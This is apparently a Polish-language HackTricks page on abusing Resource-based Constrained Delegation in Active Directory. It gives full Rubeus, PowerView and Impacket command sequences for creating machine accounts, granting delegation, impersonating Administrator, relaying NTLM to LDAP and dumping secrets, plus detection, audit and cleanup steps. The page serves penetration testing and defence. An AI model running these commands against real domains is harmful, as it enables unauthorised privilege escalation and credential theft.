# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Podstawy Resource-based Constrained Delegation

Resource-based constrained delegation (RBCD) jest podobne do [constrained delegation](constrained-delegation.md), ale kierunek zaufania jest odwrotny. Tradycyjne constrained delegation określa, do których usług principal może delegować; RBCD określa na **zasobie docelowym**, które principals mogą podszywać się pod użytkowników wobec tego zasobu.<sup>[[12]](#references)</sup>

Atrybut obiektu docelowego _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ zawiera deskryptor zabezpieczeń wskazujący principals uprawnione do działania w imieniu innych tożsamości wobec danego zasobu.

Kolejną ważną różnicą jest to, że principal z wystarczającymi **uprawnieniami zapisu do konta maszyny** (`GenericAll`, `GenericWrite`, `WriteDacl`, `WriteProperty` i podobne prawa) może być w stanie ustawić _**msDS-AllowedToActOnBehalfOfOtherIdentity**_. Konfiguracja tradycyjnego constrained delegation zwykle wymaga bardziej uprzywilejowanego dostępu administracyjnego.<sup>[[1]](#references)</sup>

Mówiąc dokładniej, zmiana ustawień klasycznego constrained delegation zwykle wymaga uprawnienia `SeEnableDelegationPrivilege` na kontrolerze domeny, które zazwyczaj mają wysoce uprzywilejowani administratorzy. RBCD przenosi decyzję do deskryptora zabezpieczeń obiektu docelowego, więc dostęp do zapisu odpowiedniej właściwości obiektu komputera może wystarczyć bez tego uprawnienia użytkownika.<sup>[[1]](#references)[[2]](#references)</sup>

### Nowe pojęcia

Flaga **`TrustedToAuthForDelegation`** w `userAccountControl` jest często opisywana jako warunek wstępny **S4U2Self**, ale to niepełny opis.\
Service principal z SPN może zażądać S4U2Self bez tej flagi. Gdy ustawiono `TrustedToAuthForDelegation`, zwracany bilet usługi jest **forwardable**; bez niej bilet jest zwykle **non-forwardable**.<sup>[[5]](#references)</sup>

Tradycyjne constrained delegation odrzuca **non-forwardable TGS** na etapie S4U2Proxy. RBCD może zaakceptować ten bilet S4U2Self, jeśli deskryptor zabezpieczeń celu upoważnia żądającą usługę.<sup>[[1]](#references)[[2]](#references)[[16]](#references)</sup>

### Struktura ataku

> Jeśli masz **uprawnienia równoważne prawom zapisu** do **konta komputera**, możesz być w stanie uzyskać uprzywilejowany dostęp do tej maszyny.

Załóżmy, że atakujący ma już **uprawnienia równoważne prawom zapisu do obiektu komputera ofiary**.

1. Atakujący **przejmuje** konto z **SPN** lub **tworzy takie konto** („Service A”). Domyślnie uwierzytelniony użytkownik domeny może utworzyć do 10 obiektów komputerów, zgodnie z ustawieniem **_MachineAccountQuota_**; obiekt komputera automatycznie udostępnia użyteczne SPN-y.
2. Atakujący **nadużywa swoich uprawnień WRITE** do komputera ofiary (ServiceB), aby skonfigurować **resource-based constrained delegation, która pozwala ServiceA podszywać się pod dowolnego użytkownika** wobec tego komputera ofiary (ServiceB).
3. Atakujący używa Rubeus do przeprowadzenia **pełnego ataku S4U** (S4U2Self i S4U2Proxy) z Service A do Service B dla użytkownika **mającego uprzywilejowany dostęp do Service B**.
   1. S4U2Self (z przejętego lub utworzonego konta SPN): zażądaj **TGS reprezentującego Administratora dla Service A** (non-forwardable).
   2. S4U2Proxy: użyj tego **non-forwardable TGS**, aby zażądać biletu usługi reprezentującego **Administratora** dla **hosta ofiary**.
   3. Bilet non-forwardable nadal może zadziałać w tym przepływie RBCD, ponieważ Service A jest upoważniona w deskryptorze zabezpieczeń zasobu docelowego.
4. Atakujący może użyć **pass-the-ticket** i **podszyć się** pod użytkownika, aby uzyskać **dostęp do ServiceB ofiary**.<sup>[[1]](#references)</sup>

`MachineAccountQuota=0` zamyka domyślną ścieżkę tworzenia komputerów, ale nie usuwa uprawnień zapisu do obiektu komputera docelowego ani kontroli nad istniejącym kontem. Kontrolowany zwykły użytkownik bez SPN może czasami posłużyć jako delegujący principal przy użyciu [metody U2U bez SPN](#spn-less-cross-domain--cross-forest-rbcd), również w obrębie jednej domeny. Ta ścieżka nadal wymaga skutecznego uprawnienia do zapisu RBCD, kontroli nad poświadczeniami delegującego użytkownika, tożsamości, pod którą można się podszyć, zgodnego zachowania szyfrowania Kerberos oraz zmiany NT-hash, która zakłóca działanie konta. Traktuj te elementy jako odrębne warunki wstępne; sam pusty atrybut RBCD lub zerowy limit nie dowodzą ani powodzenia, ani bezpieczeństwa.

Istniejący deskryptor RBCD może również wskazywać **grupę**, a nie bezpośrednio delegujący komputer. Jeśli kontrolujesz konto komputera mające SPN i możesz dodać je do tej grupy, nowe członkostwo może zapewnić ścieżkę delegacji bez zmiany atrybutu RBCD komputera docelowego. Przed stwierdzeniem, że ta ścieżka działa, sprawdź efektywne ACL grupy dotyczące zapisu członkostwa (w tym ACE typu deny), zagnieżdżone członkostwo i odświeżenie tokenu, SID podmiotu wskazanego w deskryptorze, ograniczenia delegacji nałożone na konto, pod które się podszywasz, oraz SPN usługi docelowej.

Aby sprawdzić _**MachineAccountQuota**_ domeny, możesz użyć:

```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```

## Atak

### Tworzenie obiektu komputera

Możesz utworzyć obiekt komputera w domenie za pomocą **[powermad](https://github.com/Kevin-Robertson/Powermad):**<sup>[[3]](#references)[[4]](#references)</sup>

```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```

### Konfigurowanie delegowania ograniczonego opartego na zasobach

**Korzystanie z modułu PowerShell Active Directory**<sup>[[4]](#references)</sup>

```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assign delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```

**Używanie powerview**<sup>[[3]](#references)</sup>

```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```

### Przeprowadzanie pełnego ataku S4U (Windows/Rubeus)

Najpierw utworzyliśmy nowy obiekt komputera z hasłem `123456`, więc potrzebujemy hasha tego hasła:<sup>[[3]](#references)[[4]](#references)</sup>

```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```

Spowoduje to wyświetlenie hashy RC4 i AES dla tego konta.\
Teraz można przeprowadzić atak:<sup>[[3]](#references)[[4]](#references)</sup>

```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```

Możesz wygenerować więcej tickets dla kolejnych usług, prosząc tylko raz, używając parametru `/altservice` w Rubeus:

```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```

> [!CAUTION]
> Użytkownicy mogą być oznaczeni jako **„Konto jest wrażliwe i nie można go delegować”**. Jeśli ta flaga jest włączona, nie można podszywać się pod to konto w ramach tego przepływu delegowania. BloodHound udostępnia tę właściwość podczas analizy.

### Narzędzia w systemie Linux: kompleksowe RBCD z Impacket (2024+)

Jeśli działasz z systemu Linux, możesz przeprowadzić pełny łańcuch RBCD za pomocą oficjalnych narzędzi Impacket:<sup>[[6]](#references)[[7]](#references)</sup>

```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```

Uwagi
- Jeśli wymuszono podpisywanie LDAP/LDAPS, użyj `impacket-rbcd -use-ldaps ...`.
- Preferuj klucze AES; wiele nowoczesnych domen ogranicza RC4. Impacket i Rubeus obsługują przepływy oparte wyłącznie na AES.
- Impacket może przepisać `sname` („AnySPN”) na potrzeby niektórych narzędzi, ale zawsze, gdy to możliwe, uzyskaj prawidłowy SPN (np. CIFS/LDAP/HTTP/HOST/MSSQLSvc).

## RBCD między domenami i lasami

Jeśli kontrolowany przez Ciebie **podmiot delegujący** znajduje się w **innej domenie** (lub nawet **innym lesie**) niż **komputer zasobu**, nadużycie nadal dotyczy **RBCD**, ale przepływ biletów nie przebiega już według standardowego schematu dla jednej domeny `S4U2Self -> S4U2Proxy`.

### RBCD między domenami: skonfiguruj obcy podmiot za pomocą SID

Gdy ustawiasz `msDS-AllowedToActOnBehalfOfOtherIdentity` z **innej domeny**, obca maszyna lub użytkownik mogą **nie być rozpoznawalni po nazwie** w LDAP domeny docelowej. W takim przypadku skonfiguruj wpis delegowania za pomocą **SID** obcego podmiotu zamiast jego sAMAccountName/UPN.

Ma to szczególne znaczenie podczas przekazywania NTLM do LDAP za pomocą `ntlmrelayx.py`:<sup>[[9]](#references)</sup>

```bash
sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
  --no-dump --no-da --no-validate-privs \
  --delegate-access \
  --escalate-user S-1-5-21-3104832133-133926542-3798009529-1106 \
  --sid
```

Uwagi:
- `--sid` informuje `ntlmrelayx.py`, aby traktował `--escalate-user` jako SID. Jest to wymagane, gdy konto delegujące należy do innej domeny niż domena docelowa.
- Nawet jeśli narzędzie wyświetli komunikat `User not found in LDAP`, zapis delegacji może się powieść, ponieważ deskryptor zabezpieczeń przechowuje bezpośrednio obcy SID.

### RBCD między domenami: sekwencja S4U między realmami

Gdy obcy principal znajdzie się w `msDS-AllowedToActOnBehalfOfOtherIdentity`, działający przepływ między domenami wygląda następująco:<sup>[[9]](#references)[[13]](#references)</sup>

1. Pobierz **TGT** dla principalu delegującego z jego własnej domeny.
2. Zażądaj **referral TGT** dla `krbtgt/<target-domain>`.
3. Zażądaj **cross-realm S4U2Self referral** dla podszywanego użytkownika na kontrolerze domeny docelowej.
4. Zażądaj właściwego biletu **S4U2Self** dla tego użytkownika z powrotem w domenie delegującej.
5. Wykonaj **S4U2Proxy** w domenie delegującej, aby uzyskać bilet referral dla domeny docelowej.
6. Wykonaj końcowe **S4U2Proxy** na kontrolerze domeny docelowej, aby uzyskać bilet usługi dla `cifs/host.target`, `host/host.target` itd.

Dlatego standardowe narzędzia dla Linuxa często zawodzą w przypadku RBCD między domenami:<sup>[[9]](#references)</sup>
- realm żądania może wymagać innej wartości niż realm TGT użytego w `TGS-REQ`
- łańcuch wymaga **niezależnych etapów S4U2Proxy**, a nie tylko `S4U2Self` lub `S4U2Self` bezpośrednio połączonego z pojedynczym `S4U2Proxy`

### RBCD między domenami z Linuxa

Synacktiv opublikował implementację `getST.py` z Impacket, która odtwarza sekwencję między realmami z Linuxa, jawnie obsługując oba KDC:<sup>[[9]](#references)[[11]](#references)</sup>

```bash
python3 ./getST.py dev.asgard.local/rbcd_test\$:R[...]5 -k \
  -dc-ip 192.168.90.131 \
  -targetdc 192.168.90.217 \
  -targetdomain asgard.local \
  -impersonate thor_adm \
  -spn cifs/workstation.asgard.local

KRB5CCNAME=thor_adm@cifs_workstation.asgard.local@ASGARD.LOCAL.ccache \
  ./smbclient.py "asgard.local/thor_adm@workstation.asgard.local" \
  -k -no-pass -dc-ip 192.168.90.217
```

Operacyjnie nowe argumenty to:
- `-dc-ip`: DC domeny **delegującej**
- `-targetdomain`: domena **komputera zasobu**
- `-targetdc`: DC domeny **zasobu**

### Ograniczenia RBCD między lasami

RBCD między lasami ma istotne ograniczenie: **podszywany użytkownik musi należeć do tego samego lasu co delegujący principal**. Innymi słowy, jeśli kontrolowane przez ciebie konto komputera znajduje się w `valhalla.local`, a docelowy zasób w `asgard.local`, na ogół **nie możesz podszywać się pod dowolnych użytkowników `asgard.local` na tym zasobie za pomocą RBCD**.<sup>[[9]](#references)</sup>

Nadal można to wykorzystać, gdy:
- użytkownik z **delegującego lasu** jest **lokalnym administratorem** (lub ma inne uprawnienia) na hoście zasobu w drugim lesie
- zaufanie umożliwia wymagany przepływ uwierzytelniania, a obcy SID jest akceptowany w deskryptorze zabezpieczeń komputera docelowego

### Osobliwości protokołu RBCD między lasami

RBCD między lasami to nie tylko „między domenami plus zaufanie”. Zaobserwowany przepływ obejmuje dwie osobliwości, które historycznie umykały popularnym narzędziom:<sup>[[9]](#references)</sup>

1. Dodatkowe żądanie **S4U2Proxy**, które ustawia **`PA-PAC-OPTIONS=branch-aware`**
2. Końcowy ticket usługi, który może zostać zwrócony przy użyciu **RC4**, nawet jeśli żądano innych typów szyfrowania

Praktyczny przepływ wygląda następująco:

1. Uzyskaj TGT dla delegującego principal w lesie A.
2. Zażądaj **S4U2Self** dla podszywanego użytkownika w lesie A.
3. Zażądaj **S4U2Proxy** w lesie A, aby uzyskać referencyjny TGT dla lasu B.
4. Wyślij drugie żądanie **S4U2Proxy** w lesie A **bez** ticketu S4U2Self jako dodatkowego ticketu, ale z włączonym `branch-aware`, aby uzyskać kolejny referencyjny TGT dla lasu B.
5. Opcjonalnie zażądaj zwykłego ticketu usługi w lesie B dla delegującego principal (ten ticket nie jest wymagany do końcowego nadużycia).
6. Użyj referencyjnych ticketów z kroków 3 i 4, aby zażądać końcowego ticketu **S4U2Proxy** w lesie B dla podszywanego użytkownika z lasu A do docelowego SPN.

### RBCD między lasami z Linuksa

Ta sama gałąź Impacket od Synacktiv dodaje przełącznik `-forest` obsługujący tę logikę:<sup>[[9]](#references)[[11]](#references)</sup>

```bash
python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
  -impersonate 'v_thor' \
  -dc-ip VALHALLA.local \
  valhalla.local/'desktop$' \
  -targetdc ASGARD.local \
  -targetdomain asgard.local \
  -aesKey 4[...]f \
  -forest
```

### Rekurencyjne RBCD w wielu domenach (3+ domeny)

W **lasach obejmujących wiele domen** zarówno **S4U2Self**, jak i **S4U2Proxy** mogą działać **rekurencyjnie**, zamiast zatrzymywać się po jednym referral:

- **Rekurencyjne S4U2Self**: pierwsze `S4U2Self` jest wysyłane do **domeny impersonowanego użytkownika**, pośrednie przeskoki między domeną nadrzędną i podrzędną są obsługiwane za pomocą zwykłych referral `TGS-REQ` dla `krbtgt/<REALM>`, a **końcowe `S4U2Self`** jest wysyłane we **własnej domenie delegującego principalu**.
- Oznacza to, że **samo posiadanie TGT** dla konta maszyny może wystarczyć, aby impersonować **administratora z innej domeny w tym samym lesie** i zażądać `cifs/host`, `host/host`, `wsman/host` itd.
- **Rekurencyjne S4U2Proxy** podąża tą samą ścieżką zaufania: pośrednie przeskoki ponownie używają poprzedniego biletu jako TGT podczas żądania kolejnego referral `krbtgt/<REALM>`, a dopiero ostatni przeskok zwraca końcowy service ticket.<sup>[[10]](#references)</sup>

Przykład praktyczny w obrębie tego samego lasu:

```bash
KRB5CCNAME=MIN-FRPERSO-01\$.ccache getST.py 'minus.sub.frperso.local/MIN-FRPERSO-01$' -k -no-pass \
  -impersonate Administrator@frperso.local -self \
  -altservice cifs/min-frperso-01.minus.sub.frperso.local

KRB5CCNAME=Administrator@frperso.local@cifs_min-frperso-01.minus.sub.frperso.local@MINUS.SUB.FRPERSO.LOCAL.ccache \
  smbclient.py frperso.local/Administrator@min-frperso-01.minus.sub.frperso.local -k -no-pass
```

### SPN-less RBCD między domenami / lasami

Jeśli **delegujący principal jest użytkownikiem bez SPN**, ostatnie rekurencyjne `S4U2Self` kończy się błędem **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**. Obejściem problemu jest **ponowienie tylko ostatniego kroku jako `S4U2Self+U2U`**.<sup>[[10]](#references)</sup>

Skrócony opis łańcucha nadużycia:

1. Uwierzytelnij się przy użyciu **hasha NT**, aby skłonić KDC do użycia **RC4-HMAC (etype 23)**.
2. Najpierw zażądaj **`-self -u2u`** i zachowaj ten bilet oddzielnie od późniejszego kroku proxy.
3. Wyodrębnij **klucz sesji TGT** za pomocą `describeTicket.py`.
4. Zastąp **hash NT** użytkownika tym **kluczem sesji** za pomocą `changepasswd.py -newhashes <session_key>`.
5. Użyj ponownie biletu `S4U2Self+U2U` jako **`-additional-ticket`** podczas osobnego żądania **`-proxy`**.

```bash
getST.py sub.frperso.local/Administrator -hashes ':<nthash>' \
  -impersonate Administrator@frperso.local -self -u2u
describeTicket.py Administrator.ccache
changepasswd.py sub.frperso.local/Administrator@sub-frperso-01.sub.frperso.local \
  -hashes ':<nthash>' -newhashes <tgt_session_key>
KRB5CCNAME=Administrator.ccache getST.py sub.frperso.local/Administrator -k -no-pass \
  -impersonate Administrator@frperso.local -proxy -proxydomain frpublic.local \
  -spn cifs/frpublic-01.frpublic.local -additional-ticket '<u2u_ticket.ccache>'
```

Zastrzeżenia operacyjne:

- Gdy **pierwszym zaufanym przeskokiem jest już inny las**, preferuj algorytm **branch-aware** (`getST.py ... -forest`), aby dopasować się do natywnego zachowania Windows. Jeśli do obcego lasu prowadzi dopiero dalszy etap łańcucha, rekurencyjny przepływ non-branch-aware może nadal działać.<sup>[[9]](#references)</sup>
- Na nowszych kontrolerach domeny **Windows Server 2022/2025** wymuszenie RC4 może zakończyć się błędem **`KDC_ERR_ETYPE_NOSUPP`** z powodu wycofywania RC4; przez to **RBCD bez SPN może być niemożliwe**, mimo że klasyczne RBCD oparte na SPN nadal działa z AES.<sup>[[15]](#references)</sup>
- Uruchom **`S4U2Self+U2U` przed zmianą hasha/hasła użytkownika**: **`SamrChangePasswordUser`** nie przelicza kluczy AES Kerberos konta, więc wcześniejsza zmiana hasła może uniemożliwić późniejsze żądania biletów.<sup>[[14]](#references)</sup>
- Podszywane konto nadal musi **dopuszczać delegowanie**: **Protected Users** oraz konta z ustawieniem **`NOT_DELEGATED`** / **„Konto jest wrażliwe i nie można go delegować”** blokują łańcuch.

## Uwagi dotyczące wykrywania / zabezpieczania

- Ścieżki RBCD między domenami/lasami są nadal zwykle tworzone przez **nadużycie ACL** lub **relay-to-LDAP**. Włącz **LDAP signing** i **LDAP channel binding** na kontrolerach domeny, aby przerwać typowe ścieżki konfiguracji.
- Sprawdź, kto może zapisywać atrybut `msDS-AllowedToActOnBehalfOfOtherIdentity` w obiektach komputerów, i rozwiąż zapisane identyfikatory SID, w tym **foreign security principals**.
- W środowiskach z wieloma relacjami zaufania sprawdź **Selective Authentication**, **SID filtering** oraz to, czy użytkownicy z obcego lasu mają uprawnienia **local admin** na hostach zasobów.

### Uzyskiwanie dostępu

Ostatni wiersz poleceń wykona **pełny atak S4U i wstrzyknie TGS** od Administratora na host ofiary do **pamięci**.\
W tym przykładzie zażądano TGS dla usługi **CIFS** od Administratora, więc będzie można uzyskać dostęp do **C$**:

```bash
ls \\victim.domain.local\C$
```

### Nadużywanie różnych biletów usługowych

Dowiedz się więcej o [**dostępnych biletach usługowych tutaj**](silver-ticket.md#available-services).

## Enumerowanie, audyt i czyszczenie

### Wyliczanie komputerów ze skonfigurowanym RBCD

PowerShell (dekodowanie SD w celu rozwiązania SID-ów):

```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
  Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
  ForEach-Object {
    $raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
    $sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
    $sd.DiscretionaryAcl | ForEach-Object {
      $sid  = $_.SecurityIdentifier
      try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
      [PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
    }
  }
```

Impacket (odczyt lub opróżnienie jednym poleceniem):

```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```

### Czyszczenie / resetowanie RBCD

- PowerShell (wyczyść atrybut):

```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```

- Impacket:

```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```

## Błędy Kerberos

- **`KDC_ERR_ETYPE_NOTSUPP`**: Oznacza to, że Kerberos skonfigurowano tak, aby nie używał DES ani RC4, a Ty podajesz tylko hash RC4. Podaj Rubeus co najmniej hash AES256 (albo po prostu hashe RC4, AES128 i AES256). Przykład: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** podczas `-self` dla zwykłego użytkownika: delegujący principal prawdopodobnie **nie ma SPN**. Ponów **ostatni etap** jako **`S4U2Self+U2U`**, zamiast zwykłego `S4U2Self`.<sup>[[10]](#references)</sup>
- **`KDC_ERR_ETYPE_NOSUPP`** podczas **RBCD bez SPN**: nowsze DC mogą odrzucać wymuszoną ścieżkę **RC4-HMAC** wymaganą przez sztuczkę `S4U2Self+U2U` + podstawienie klucza sesji. Zamiast tego spróbuj klasycznej ścieżki RBCD opartej na **SPN**, używającej AES.<sup>[[10]](#references)[[15]](#references)</sup>
- **`KRB_AP_ERR_SKEW`**: Oznacza to, że czas na bieżącym komputerze różni się od czasu na DC, przez co Kerberos nie działa prawidłowo.
- **`preauth_failed`**: Oznacza to, że podana nazwa użytkownika i hashe nie działają przy logowaniu. Być może zapomniałeś dodać znak "$" do nazwy użytkownika podczas generowania hashy (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: Może to oznaczać, że:
  - Użytkownik, którego próbujesz podszyć, nie ma dostępu do żądanej usługi (bo nie możesz się pod niego podszyć albo nie ma wystarczających uprawnień)
  - Żądana usługa nie istnieje (jeśli prosisz o ticket dla winrm, ale winrm nie działa)
  - Utworzony fakecomputer utracił uprawnienia do podatnego serwera i musisz je mu przywrócić.
  - Nadużywasz klasycznego KCD; pamiętaj, że RBCD działa z niewysyłalnymi dalej ticketami S4U2Self, podczas gdy KCD wymaga ticketów z możliwością dalszego przekazywania.

## Uwagi, relaye i alternatywy

- Możesz też zapisać RBCD SD przez AD Web Services (ADWS), jeśli LDAP jest filtrowany. Zobacz:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Łańcuchy relay Kerberos często kończą się na RBCD, aby jednym krokiem uzyskać lokalne uprawnienia SYSTEM. Zobacz praktyczne przykłady kompleksowe:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- Jeśli LDAP signing/channel binding są **wyłączone** i możesz utworzyć konto komputera, narzędzia takie jak **KrbRelayUp** mogą przekazać wymuszone uwierzytelnienie Kerberos do LDAP, ustawić `msDS-AllowedToActOnBehalfOfOtherIdentity` dla konta Twojego komputera na obiekcie docelowego komputera, a następnie natychmiast podszyć się pod **Administratora** przez S4U z hosta zewnętrznego.<sup>[[8]](#references)</sup>

## References

- [1] [Machanie psem: nadużywanie delegowania ograniczonego na podstawie zasobów w celu atakowania Active Directory](https://eladshamir.com/2019/01/28/Wagging-the-Dog.html)
- [2] [Jeszcze słowo o delegowaniu – harmj0y](https://blog.harmj0y.net/redteaming/another-word-on-delegation/)
- [3] [Delegowanie ograniczone na podstawie zasobów Kerberos: przejęcie obiektu komputera](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [4] [Netwrix – nadużywanie delegowania ograniczonego na podstawie zasobów](https://netwrix.com/en/resources/blog/resource-based-constrained-delegation-abuse/)
- [5] [Kerberosity uśmierciło domenę: ofensywny przegląd Kerberos](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [6] [Impacket rbcd.py (oficjalne)](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)
- [7] [Szybka ściągawka dla Linuksa z aktualną składnią](https://tldrbins.github.io/rbcd/)
- [8] [0xdf – HTB Bruno (LDAP signing wyłączone → relay Kerberos do RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [9] [Synacktiv - Badanie RBCD między domenami i lasami](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
- [10] [Synacktiv - Badanie RBCD między domenami i lasami: część 2](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
- [11] [Gałąź Impacket Synacktiv - cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
- [12] [Microsoft Learn - przegląd delegowania ograniczonego Kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [13] [Microsoft Open Specifications - S4U2Self między domenami](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
- [14] [Microsoft Open Specifications - SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
- [15] [Microsoft Learn - wykrywanie i usuwanie użycia RC4 w Kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)
- [16] [Microsoft Open Specifications – szczegóły S4U2Proxy](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/bde93b0e-f3c9-4ddf-9cd5-e9c237331c90)
{{#include ../../banners/hacktricks-training.md}}
